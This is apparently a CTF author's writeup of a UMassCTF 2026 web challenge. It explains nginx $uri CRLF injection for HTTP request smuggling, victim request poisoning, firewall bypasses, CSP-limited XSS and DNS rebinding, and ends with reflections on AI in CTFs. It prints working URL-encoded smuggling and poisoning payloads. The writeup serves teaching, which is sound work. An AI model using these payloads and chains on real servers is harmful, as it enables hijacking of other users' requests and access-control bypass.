---
author: atch2203
pubDatetime: 2026-09-05
title: Undercover Pirate Author Writeup
featured: false
draft: false
tags:
  - cybersec
  - writeups
description: Author writeup for UMassCTF 2026 web challenge
---
This post is long overdue, but it is finally here. Around 5 months ago (April 10-12), the UMass Cybersec Club hosted our annual global CTF, UMassCTF 2026. This year featured some improvements (powered by AI), including a challenge instancer and increased infra uptime.

This year I wanted to make a challenge that involved HTTP request smuggling. I was inspired by James Kettle's many talks on HTTP request smuggling (which you can find on youtube). I would recommend familiarizing yourself the concepts behind [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling), namely how HTTP works and the desync between what the proxy sees versus the backend, before reading this writeup.

If you want to skip to the writeup, click [here](#challenge).

# Initial ideas
I originally wanted to use a more standard form of request smuggling using a CL-TE desync. I looked into known desyncs in proxy-backend configurations. I looked into nginx, traefik, haproxy combined with backends such as flask and expressjs. I tried every well known combination I could, but unfortunately (or fortunately), there was no instance of HTTP request smuggling I could find. 

## Finding the key primitive
While I was experimenting with proxies, another challenge author (@lithiumsodium) told me about their challenge idea, which was to use [nginx $url CRLF injection](https://reversebrain.github.io/2021/03/29/The-story-of-Nginx-and-uri-variable/) to get cache deception and steal an admin's CSRF token. Thinking about it as a primitive, with the below config, you could smuggle in your own request by url encoding newlines.
```nginx
server {
    listen 80;
    server_name _;
	
	location / {
	    proxy_pass http://backend$uri;
	}
}
```

As a refresher, `$uri` normalizes the uri/endpoint part of the url, *including newlines*. Combined with an HTTP/1.1 connection, we can mess with the HTTP request that gets sent upstream.

Here is the network diagram we will be using for the below examples.
```java
you <--> proxy (nginx) <--> backend (expressjs)
```


What do I mean when I say "mess with the HTTP request"? Let's look at an example.
Let's try to send a request to `http://proxy/endpoint%0d%0aTEST:%20HEADER`. After nginx normalizes `endpoint%0d%0aTEST:%20HEADER`, it forwards the following request to the backend. Note the two newlines at the end of the request as per the HTTP/1.1 specification.

```http title="Proxy POV (what we send to the proxy)"
GET /endpoint%0d%0aTEST:%20HEADER HTTP/1.1
Host: proxy

```
<div class="side-by-side">

```http title="Backend POV (what the proxy sends to the backend)" "\nTEST: HEADER":bg=#550000
GET /endpoint
TEST: HEADER HTTP/1.1
Host: backend

```

```http title="The result"
HTTP/2 200 OK
...
```

</div>


> This is a small detail, but the HTTP spec still accepts requests even if they don't have a version number!


In fact, we can demonstrate that the backend actually sees the headers we're injecting by injecting an E-Tag.


```http title="Proxy POV" "%20HTTP/1.1%0d%0aIf-None-Match:%20W/\"84e-w+kiGh/N0swB9TVkVA1PtcE4hJA\"%0d%0aTrash:":bg=#550000
GET /%20HTTP/1.1%0d%0aIf-None-Match:%20W/"84e-w+kiGh/N0swB9TVkVA1PtcE4hJA"%0d%0aTrash: HTTP/2
Host: product.pirate.bay

```
<div class="side-by-side">

```http title="Backend POV" " HTTP/1.1\nIf-None-Match: W/\\"84e-w+kiGh/N0swB9TVkVA1PtcE4hJA\\"\nTrash:":bg=#550000
GET / HTTP/1.1
If-None-Match: W/"84e-w+kiGh/N0swB9TVkVA1PtcE4hJA"
Trash: HTTP/1.1
Host: backend

```

```http title="The result"
HTTP/2 304 Not Modified
...
```

</div>

![altText](@assets/images/undercoverpirate/undercoverpirate-2.png)

> As you may have noticed, the hostname and HTTP versions in the image don't match the examples exactly. I'm using the challenge to demonstrate, where the `backend` is renamed to `product`. For consistency, every mention of `backend` in code will be `product` from now on.

### Getting HTTP request smuggling with this
I'm assuming you are somewhat familiar with HTTP request smuggling, but to be honest, this primitive is slightly different from normal HTTP request smuggling scenarios and is hopefully understandable with no prior knowledge.

> HTTP/1.1 has a fatal flaw: attackers can create extreme ambiguity about where one request ends, and the next request starts.
- James Kettle, [HTTP/1.1 Must Die](https://http1mustdie.com/)

For TE-CL, 0.CL, and other standard desyncs, "extreme ambiguity" is a good way to describe the difference between the proxy and backend. The same request gets interpreted differently due to the ambiguity of respecting Transport Encoding, Content Length, or some parameter.

However, "ambiguity" isn't exactly a good descriptor for what we're doing here. Nginx is modifying (decoding) the request on the way to the backend, allowing us to inject whatever we want into the HTTP request. Since HTTP/1.1 uses two newlines to separate requests, we could, in theory, we could just add two newlines to inject another request. Let's try it!

```http title="Proxy POV" "%20HTTP/1.1%0d%0aHost:%20product%0d%0a%0d%0a":bg=#550000
GET /%20HTTP/1.1%0d%0aHost:%20product%0d%0a%0d%0a HTTP/2
Host: product.pirate.bay

```
<div class="side-by-side">

```http title="Backend POV" " HTTP/1.1\nHost: product\n\n":bg=#550000
GET / HTTP/1.1
Host: product

 HTTP/1.1
Host: product

```

```http title="The result"
HTTP/2 400 Bad Request
...
```

</div>

Hmm. What's going wrong here? We sent a full request with a double newline ending, and yet our request is still invalid. It must be all the trash at the end of our request. Let's try fixing it by prepending the missing pieces of the second request.


```http title="Proxy POV" "%20HTTP/1.1%0d%0aHost:%20product%0d%0a%0d%0aGET%20/req2":bg=#550000
GET /%20HTTP/1.1%0d%0aHost:%20product%0d%0a%0d%0aGET%20/req2 HTTP/2
Host: product.pirate.bay

```
<div class="side-by-side">

```http title="Backend POV" " HTTP/1.1\nHost: product\n\nGET /req2":bg=#550000
GET / HTTP/1.1
Host: product

GET /req2 HTTP/1.1
Host: product

```

```http title="The result"
HTTP/2 200 OK
...
```

</div>

Perfect! We get a valid response back. In fact, we can see that two requests are seen by the backend.

![altText](@assets/images/undercoverpirate/undercoverpirate-8.png)

Ok, now we're cooking. We've established we can get more than one request to the backend from a single request, but how else can we leverage the primitive?

### Getting to poisoning: Content Length

> A single HTTP request can make a website lose track of which responses should go to which users, resulting in massive disclosure of confidential information. This typically results in [users being randomly logged into other live user's accounts](https://portswigger.net/research/http2#splitting).  
> HTTP Request Smuggling also enables attackers to poison your website's cache with malicious JavaScript. This typically gives them persistent control over every page on your website, and lets them steal passwords and credit card details. For example, we were previously able to [compromise PayPal's login page](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#paypal).
- James Kettle, [HTTP/1.1 Must Die](https://http1mustdie.com/)

Specifically, we want to recreate the "request poisoning" scenario. That is, we send a request to the proxy that contains (almost) two requests, and the next person to send a request through the proxy gets malicious data prepended to their request.
![altText](@assets/images/undercoverpirate/undercoverpirate-9.png)

We just showed that we can send two requests in a single request, but how can we break the boundary of the second request to append it to the start of the victim's request? 

![altText](@assets/images/undercoverpirate/undercoverpirate-13.png)
<div align="center" style="color:#888888">You vs the request poison she tells you not to worry about</div>

Since our request always ends in a double newline (it's inevitable, our primitive can only inject in between the endpoint and http version), we have to find a way to "absorb" the double newline for our malicious request. This sounds like a job for `Content-Length`! If we add a body to our request and set its length long enough, we can make the double newline (and maybe even the victim's request 👀) part of the body! Let's first do a sanity check:

```http title="Proxy POV" "%20HTTP/1.1%0d%0aHost:%20product%0d%0aContent-Type:%20text/plain%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/":bg=#550000
GET /%20HTTP/1.1%0d%0aHost:%20product%0d%0aContent-Type:%20text/plain%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/ HTTP/2
Host: product.pirate.bay

```
<div class="side-by-side">

```http " HTTP/1.1\nContent-Type: text/plain\nContent-Length: 0\nHost: product\n\nGET /":bg=#550000 title="Backend POV"
GET / HTTP/1.1
Content-Type: text/plain
Content-Length: 0
Host: product

GET / HTTP/1.1
Host: product

```

```http title="The result"
HTTP/2 200 OK
...
```

</div>

> Note the `Content-Type` header as well. I found that Express.js will only respect `Content-Length` if you both configure the backend to accept data (url encoded, json, etc) and include the correct `Content-Type` header in your request.

Well that was pretty underwhelming, we got the same behavior of two requests in the backend. Let's actually try to demonstrate a change by "absorbing" the garbage in our initial double request.

```http title="Proxy POV" "%20HTTP/1.1%0d%0aHost:%20product%0d%0aContent-Type:%20text/plain%0d%0aContent-Length:%2028%0d%0a%0d%0a":bg=#550000
GET /%20HTTP/1.1%0d%0aHost:%20product%0d%0aContent-Type:%20text/plain%0d%0aContent-Length:%2028%0d%0a%0d%0a HTTP/2
Host: product.pirate.bay

```
<div class="side-by-side">

```http " HTTP/1.1\nContent-Type: text/plain\nContent-Length: 28\nHost: product\n\n":bg=#550000 " HTTP/1.1\nHost: product\n":bg=#005555 "28":bg=#005555 title="Backend POV"
GET / HTTP/1.1
Content-Type: text/plain
Content-Length: 28
Host: product

 HTTP/1.1
Host: product

```

```http title="The result"
HTTP/2 200 OK
...
```

</div>

![altText](@assets/images/undercoverpirate/undercoverpirate-12.png)

Nice, we have one request in the backend again! One important caveat that comes with the usage of content length to absorb garbage is that you have to be precise: 
- too little and the extra garbage will give a 400 on the entire request
- too much and the backend will hang, waiting for more data, before giving a 504

You actually have a 4 character window for your content length (in the above case any number from 24-28 would have given 200), why that is can be an exercise for the reader.

> As an exercise, you can try to get a "double request" using the `Transfer-Encoding` header instead of `Content-Length` against the backend of the challenge. After doing the exercise, you can see why we cannot poison subsequent requests using the `Transfer-Encoding` header (it requires a specific ending that our victim does not supply).

### The fun part: executing a poison
All we've done is mess around with our own requests and the backend. However, if we increase the content length past our request(s), the backend will continue to wait for data from the proxy, which will hopefully contain our victim's request. 

![altText](@assets/images/undercoverpirate/undercoverpirate-16.png)

```http title="Proxy POV" "%20HTTP%2F1.1%0D%0AHost%3A%20product%0D%0A%0D%0APOST%20%2Fhealthcheck%20HTTP%2F1.1%0D%0AHost%3A%20product%0D%0AContent-Type%3A%20text%2Fplain%0d%0acontent-Length%3a%20695%0d%0a%0d%0aHACKED":bg=#550000
GET /%20HTTP%2F1.1%0D%0AHost%3A%20product%0D%0A%0D%0APOST%20%2Fhealthcheck%20HTTP%2F1.1%0D%0AHost%3A%20product%0D%0AContent-Type%3A%20text%2Fplain%0d%0acontent-Length%3a%20695%0d%0a%0d%0aHACKED HTTP/2
Host: product.pirate.bay

```

Note that we keep a normal GET request in the front so nginx turns on the keepalive connection with the backend (which the victim then subsequently uses). If we didn't have it, nginx wouldn't reuse the connection for the victim request.

```http title="Backend POV" {1,2:bg=#005500} {4-12:bg=#000055}
GET / HTTP/1.1
Host: product

POST /healthcheck HTTP/1.1
Host: product
Content-Type: text/plain
content-Length: 695

HACKED HTTP/1.1
Host: product

GET /i-am-a-victim ...

```

After we send our request above (Proxy POV) in burpsuite, when the victim sends their request, they actually get the response to the POST request.

![altText](@assets/images/undercoverpirate/undercoverpirate-14.png)
<div align="center" style="color:#888888">POV you scanned a random QR code</div>

Once again, this comes with a few caveats:
- if we undershoot the victim's request length, they get a 400
- if we overshoot, their request hangs

In this case, our victim's request is over 600 characters long due to chromium headers (which you can see above). This is a pain point in the challenge, but there are tricks you can do to determine ahead of time the exact headers sent by the victim.

As we'll see later on, this primitive, while being simpler in idea, allows for some unique exploit chains (including forcing our victim to poison themselves!).

<h1 id="challenge">The challenge itself</h1>


*This writeup is intended to be paired with the solve script, it is not a substitute (it would otherwise be way too long).* I won't go too much into detail here, if you want you can read the solve script for exploit implementation. Hopefully this high level overview of the challenge and solution will help you with deciphering my solve script and the challenge source.

The solve script and challenge source can be found at https://github.com/UMassCybersecurity/UMassCTF26-Release/tree/main/web/undercover-agent.

## The setup
We are given a whole lot of containers in a docker compose file.
1) The vault, which has the flag
2) The captain, which can be called to look at the forum
3) The proxy, which can call any domain
4) The forum, which has basic forum functionality (including an XSS), but has a CSP
5) The product page, which has some health/debug endpoints and a different CSP
6) A CoreDNS container, so that the internal container requests go through the proxy

There are also network policies: only the captain may reach the vault, and the captain can only access pages through the proxy.

![altText](@assets/images/undercoverpirate/undercoverpirate-17.png)

### The goal
Since only the captain can access the flag, we need to:
1) call the captain to the forum
2) redirect them to the vault
3) have the captain exfiltrate the flag

This is harder than it seems, as there are small issues in every step.

## The high level solve
### Calling the captain to the forum
This first step has its own issue: in the proxy, the endpoint to call the captain is blocked, and the captain itself has been blacklisted as a reachable subdomain.

```nginx
server {
    server_name captain.${HOST};
	
    return 403;
}

server {
    server_name ~^(?<subdomain>[^\.]+)\.${HOST}$;

	location /call-captain {
		return 403;
	}
	location / {
        proxy_pass http://$subdomain$uri;
    }

}
```

For the subdomain firewall, we need a subdomain that has no `.` and still maps to the `captain` container. If we try to query all aliases for a container, we get two entries: `captain` (which is blocked), and `piratebay-captain-1` (which isn't blocked!). More generally, the second entry is `<project_name>-<container_name>-<index>`. The project name is decided by the parent folder name, which our instancer told users, and the index is always 1 (since there are no replicas). Thus, making a request to `piratebay-captain-1.pirate.bay` bypasses the subdomain firewall. 

```bash
$ docker inspect piratebay-captain-1 --format '{{range $net, $conf := .NetworkSettings.Networks}}{{$net}}: {{println $conf.Aliases}}{{end}}'

piratebay_piratenet: [piratebay-captain-1 captain]
piratebay_vault: [piratebay-captain-1 captain]
```

We can use the same CRLF injection trick to bypass the endpoint firewall. You can smuggle in a second request similar to the example double request above, making the endpoint of the second request `call-captain`. (line 235 in solve script)


### Redirecting them to the vault
Now we have the captain going to the forum page. With poisoning, we can only redirect them to the same website (ie any endpoint on the `forum` container). The only easy gadget we have in forum is a heavily CSP-nerfed XSS. The only thing that stands out is a `frame-src 'self' *` directive. While we could add an iframe to `vault`, we can't extract the flag from there; we need more control over the captain.

Thus we use an iframe whose src is `product`, more specifically the `healthcheck` endpoint. This endpoint reflects everything the user sends back at them, which can lead to some very powerful poisons. However, we have an even more strict CSP, with `default-src 'self'`. If we want JS execution we're gonna need a poisoned js script from product on a poisoned html page from product.

```
The current chain:
call captain -> 
forum (poisoned to product iframe XSS) -> 
product html (poisoned to product <script>) ->
product js
```

This creates an issue: we can set up a poison for the first product html response, but once that's used, the `proxy <-> product` connection is clear and we cannot poison the js response. The solution is to *have the captain poison themselves!* Since the CRLF injection can be done with a GET request, there's nothing stopping the admin's iframe request from setting up a poison for their next call (which is the script request).

This is a lot easier said than done; there's a lot of stuff going on at once. Here is a diagram to help you wrap your head around the request flow:

![altText](@assets/images/undercoverpirate/undercoverpirate-15.png)

Now we have arbitrary JS execution on the captain!

### Getting the vault and exfiltrating
There's one other thing that I did not tell you: even though we have JS execution on `product`, CORS prevents us from making a fetch to `vault`. Thankfully, there's a technique called **DNS rebinding** that allows us to bypass this. Say we have one domain, say `0a140003.0a0a001e.rbndr.us`, that randomly resolves to the ip of `product` or `vault`. Then we can do all of the above on product to get JS execution, and when we call `fetch("/treasure")`, the domain can resolve to vault, bypassing CORS (from the browser's POV, we're simply fetching from the same domain, which is not cross origin).

There are two caveats with this:
- We need to know the IP of product and vault, but these are hardcoded in the docker compose.
- The rebind is completely random, meaning that we need to "hit"/resolve to the right IP both times (product JS execution and the vault request). We will need to do reliability engineering to make a consistent solve script.

Once we fetch the flag, all we need to do is get it out. There are a few ways to do this (eg using domain requests), but I chose to stylishly have the captain poison our request to forum (using `window.location` because of CORS) so we get the flag back in our response.

### Reliability engineering
Doing the napkin math: 
- Calling the captain and redirecting the iframe has a 100% success rate
- Getting the poisoned product html and subsequent JS script has a 50% success rate (Chromium has a ~60s DNS TTL, so the two requests will resolve to the same IP)
- Calling treasure has a 50% success rate each DNS refresh
- Exfiltrating the flag has a 100% success rate

Naively, we only have a 25% success rate every minute or so (we have to wait for DNS TTL before we can try requesting the vault rebind). However, we can get this up in two ways:
- having multiple rebind attempts in one product JS poison
- calling the captain multiple times at once

Doing some more napkin math, you can get reliability up to around 90% with 4 captains and 3 vault rebind attempts per captain, or 99.99% with 4 working captains (ie they made it to the product JS execution) and 3 attempts per captain.

You can find the code for this at the end of the solve script.

### Some other notable tricks
- You can detect if the product poison worked by "absorbing" it yourself.
- You can use backticks to comment out all the admin junk in the poisoned JS script response.
- You can use Wireshark or CDP (pick your poison) to get the header length of each captain request
	- CDP is not as precise (you get what Chrome thinks it's sending, not what the proxy is sending); See that `admin.ts` file in the SOLVE folder for how to do this
	- Wireshark is harder to read (you don't know which packet is which request)


# Thoughts on AI and CTFs
If I'm going to be completely honest, this might be the last CTF challenge I'll ever write (or at least a CTF challenge for this format). AI has clearly shown to be very good at solving medium-hard CTF challenges, and the whole field is floundering. I have talked with others about this, and they also don't really have an answer.

I will first say that I don't think the answer is to ban AI. Doing so leads to questions about ethically and detecting AI use, and accessibility for both organizers as well as participants.

I also don't think doing nothing will end up going well. We're seeing the impacts already: CTFs are getting full cleared by plenty of people, and all challenges medium or easier have 100+ solves each. People don't learn anything from slopping challenges, which goes against one of the main reasons of CTFs to begin with.

One more promising line of thought I've seen is that CTFs need to transition to more dynamic challenges with moving goalposts. I've seen this done in DEFCON CTF and b01lers CTF pretty well. To me, this addresses the issue of difficulty: the challenges are as difficult as your competition is (like attack defense or koth), and there is no full clearing a CTF in the first hour.

I've also heard ideas about completely changing the format, with more physical or non-AI solvable aspects to the CTF (eg Hack the Fortress, physical RF challenges, etc). This addresses the issue of using AI itself, and while I think it helps to make the competition more engaging, it doesn't address the issue of education, shifting the focus away from the traditional technical CTF categories.

I'd recommend reading more about the [Ottersec Save the CTF fund](https://osec.io/blog/save-ctfs-fund/#an-example-challenge), they have a more detailed, researched, and nuanced take than I do.
